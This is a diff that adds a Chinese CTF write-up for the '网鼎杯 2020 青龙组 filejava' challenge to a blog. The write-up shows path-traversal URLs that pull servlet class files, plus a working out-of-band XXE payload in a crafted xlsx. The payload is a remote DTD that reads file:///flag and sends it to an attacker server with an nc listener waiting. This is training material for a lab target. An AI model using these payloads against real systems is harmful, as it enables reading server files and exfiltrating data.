@@ -12,6 +12,7 @@ categories: CTF做题记录
 <!-- TOC -->
 
 - [[网鼎杯 2020 青龙组]AreUSerialz](#网鼎杯-2020-青龙组areuserialz)
+- [[网鼎杯 2020 青龙组]filejava](#网鼎杯-2020-青龙组filejava)
 
 <!-- /TOC -->
 
@@ -145,3 +146,54 @@ if(isset($_GET{'str'})) {
 ```
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200922225621774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
 
+---
+# [网鼎杯 2020 青龙组]filejava
+>
+
+上传一个文件，返回下载链接，第一反应就是看看有没有LFI，看URL发现还真有
+![](https://raw.githubusercontent.com/yq1ng/blog/master/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84/image.png)
+![](https://raw.githubusercontent.com/yq1ng/blog/master/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84/image.d63tenka91k.png)
+可以看到javaweb的绝对路径爆出来了，由于也是第一次做javaweb的题，这里看了师傅们的wp，发现先去读取配置文件`web.xml`，看到三个class文件，下载下来，反编译用的 jd-gui
+>什么是web.xml？
+一般的web工程中都会用到web.xml，web.xml主要用来配置，可以方便的开发web工程。web.xml主要用来配置Filter、Listener、Servlet等。但是要说明的是web.xml并不是必须的，一个web工程可以没有web.xml文件
+![](https://raw.githubusercontent.com/yq1ng/blog/master/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84/image.wwfe2spqrhq.png)
+```
+http://03faf3d0-9b71-49ee-8604-244766b6d0ae.node3.buuoj.cn/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class
+http://03faf3d0-9b71-49ee-8604-244766b6d0ae.node3.buuoj.cn/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/ListFileServlet.class
+http://03faf3d0-9b71-49ee-8604-244766b6d0ae.node3.buuoj.cn/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class
+```
+在DownloadServlet中发现如下代码，禁止了直接读取flag
+```java
+if (fileName != null && fileName.toLowerCase().contains("flag")) {
+      request.setAttribute("message", ");
+      request.getRequestDispatcher("/message.jsp").forward((ServletRequest)request, (ServletResponse)response);
+      return;
+    } 
+```
+在UploadServlet中发现这个，对`excel-*.xlsx`文件进行读取，并打印行数，poi-ooxml-3.10存在一个xxe漏洞，[参考这个文章](https://xz.aliyun.com/t/6996)
+```java
+if (filename.startsWith("excel-") && "xlsx".equals(fileExtName))
+          try {
+            Workbook wb1 = WorkbookFactory.create(in);
+            Sheet sheet = wb1.getSheetAt(0);
+            System.out.println(sheet.getFirstRowNum());
+          } catch (InvalidFormatException e) {
+            System.err.println("poi-ooxml-3.10 has something wrong");
+            e.printStackTrace();
+          }  
+```
+接着只需要构造一个恶意的xlsx，新建一个xlsx excel-xxxx1.xlsx，使用压缩工具打开这个xlsx，修改其中的`[Content_Types].xml`，在<?xml version="1.0" encoding="UTF-8" standalone="yes"?>与<Types xmlns=“http://schemas.openxmlformats.org/package/2006/content-types”>之间添加内容：
+```
+<!DOCTYPE convert [
+<!ENTITY % remote SYSTEM "http://远程服务器IP/file.dtd">
+%remote;%int;%send;
+]>
+```
+远程服务器，先进入web根目录，创建文件file.dtd，添加内容：
+```
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://0.0.0.0:7777?popko=%file;'>">
+```
+启动监控 ： nc -lvvp 7777
+最后上传xlsx文件即可读取
+>注：由于buu靶机只能访问内网，所以服务器需要创建一个小号在进行链接
